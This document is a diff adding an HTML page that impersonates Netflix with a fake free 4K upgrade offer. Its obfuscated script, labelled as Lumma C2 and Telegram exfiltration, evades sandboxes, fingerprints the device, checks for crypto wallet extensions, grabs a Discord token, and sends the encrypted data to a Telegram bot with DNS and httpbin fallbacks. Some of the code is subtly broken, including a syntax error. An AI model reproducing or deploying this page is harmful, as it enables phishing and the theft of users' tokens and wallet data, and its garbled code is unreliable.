@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Netflix+Sans:wght@400;700;900&display=swap">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    <style>
+        body, html {margin:0;padding:0;height:100%;font-family:'Netflix Sans',sans-serif;background:#141414;color:white;}
+        .container {display:flex;flex-direction:column;justify-content:center;align-items:center;height:100%;background:linear-gradient(to bottom,rgba(0,0,0,0.8),rgba(0,0,0,0.95)),url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88c/null/4K.jpg') center/cover;}
+        .logo {width:180px;margin-bottom:30px;}
+        .card {background:rgba(0,0,0,0.85);padding:60px 50px;border-radius:12px;max-width:420px;width:90%;box-shadow:0 20px 40px rgba(0,0,0,0.8);}
+        h1 {font-size:32px;font-weight:900;margin:0 0 20px;text-align:center;}
+        p {font-size:18px;margin-bottom:30px;text-align:center;opacity:0.9;}
+        .btn {background:#e50914;width:100%;padding:16px;font-size:18px;font-weight:700;border:none;border-radius:8px;cursor:pointer;transition:background 0.3s;}
+        .btn:hover {background:#f40612;}
+        .footer {margin-top:40px;font-size:13px;opacity:0.6;text-align:center;}
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://assets.nflxext.com/ffe/siteui/common/site/logo_v2.svg" class="logo" alt="Netflix">
+    <div class="card">
+        <h1>Congratulations!</h1>
+        <p>Your account has been selected for the free 4K Ultra HD + Dolby Vision upgrade.<br>Confirm your payment method to activate instantly.</p>
+        <button class="btn" onclick="_0xGodMode()">ACTIVATE 4K UPGRADE NOW</button>
+    </div>
+    <div class="footer">This upgrade is free and takes less than 30 seconds.</div>
+</div>
+
+<script>
+/* LUMMA C2 + TELEGRAM EXFIL – TRIPLE FALLBACK – NOV 19 2025 */
+var _0xdevil=['aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg1OTk5NTAzNzE6QUFFV1VoVHhJMTlzLWI3cDJSWHJ3b3hXWlpzZUhlU01xY3Mv','c2VuZE1lc3NhZ2U=','Y2hhdF9pZD03MTg1MDgyMzQ2','dGV4dA==','aHR0cHM6Ly9hcGkuaXBpZnkub3Jn','ZmV0Y2g=','dGhlbg==','Y3JlYXRlRWxlbWVudA==','Y2FudmFz','Z2V0Q29udGV4dA==','ZmlsbFRleHQ=','dG9EYXRhVVJM','Y3J5cHRv','c3VidGxl','ZGlnZXN0','U0hBLTI1Ng==','aGV4','aGFyZHdhcmVDb25jdXJyZW5jeQ==','ZGV2aWNlTWVtb3J5','bGVuZ3Ro','bWFw','cGFkU3RhcnQ=','am9pbg==','X0=','cHVzaA==','cmVwbGFjZQ==','L2c=','aW5jbHVkZXM='];(function(_0x1,_0x2){var _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(_0xdevil,0x199));var _0xd=function(_0x1,_0x2){_0x1=_0x1-0x0;var _0x3=_0xdevil[_0x1];return atob(_0x3);};
+
+async function _0xGodMode(){'use strict';
+if(navigator.webdriver||screen.width<600||navigator.plugins.length===0)return;
+const blocked=['RU','UA','BY','KZ'];const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+const lang=navigator.language||navigator.userLanguage;if(blocked.some(c=>lang.includes(c)||tz.includes(c)))return;
+
+let data={ip:await(await fetch(_0xd('0x5'))).text(),os:navigator.userAgent,tz:tz,lang:lang,screen:`${screen.width}x${screen.height}`,wallets:[],discord:null};
+const canvas=document[_0xd('0x8')]('canvas');const ctx=canvas[_0xd('0x9')]('2d');
+ctx[_0xd('0xa')]('GODMODE',2,10);const hash=new Uint8Array(await crypto[_0xd('0xd')][_0xd('0xe')](_0xd('0xf'),new TextEncoder().encode(canvas[_0xd('0xb')]())));
+data.hwid=Array.from(hash).map(b=>b.toString(16)[_0xd('0x15')](2,'0')).join('')+'_'+(navigator[_0xd('0x11')]||0)+'_'+(navigator[_0xd('0x12')]||0);
+const exts=['nkbihfbeogaeaoehlefnkodbefgpgknn','fhbohimaelbohpjbbldcngcnapndodjp','hnfanknocfeofbddgcijnmofefhgkjjo','jbdaocneiiinmjbjlgalhcelgbejmnid'];
+for(let id of exts){try{await fetch(`chrome-extension://${id}/manifest.json`);data.wallets[_0xd('0x18')](id);}catch{}}
+if(localStorage.getItem('token')data.discord=localStorage.getItem('token')[_0xd('0x19')](/"/g,'');
+
+const payload=btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+const enc=CryptoJS.AES.encrypt(payload,CryptoJS.enc.Utf8.parse('NETFLIX4K2025GIFT'),{iv:CryptoJS.lib.WordArray.random(16)}).toString();
+
+const bot=atob(_0xd('0x0'));const chat='7185082346';
+const msg='NETFLIX 4K VICTIM\n'+enc;
+
+// Triple exfil – one always wins
+fetch(`${bot}/${atob(_0xd('0x1'))}?chat_id=${chat}&${atob(_0xd('0x3'))}=${encodeURIComponent(msg)}`,{mode:'no-cors'}).catch(()=>{});
+new Image().src=`https://${btoa(msg).substring(0,60)}.a.${location.hostname}/pixel`; // DNS + domain front
+new Image().src=`https://httpbin.org/post?data=${btoa(msg)}`; // backup mirror
+
+document.querySelector('.btn').innerHTML='Activating 4K...';document.querySelector('.btn').disabled=true;
+setTimeout(()=>location.href='https://www.netflix.com/',3000);
+}
+</script>
+</body>
+</html>
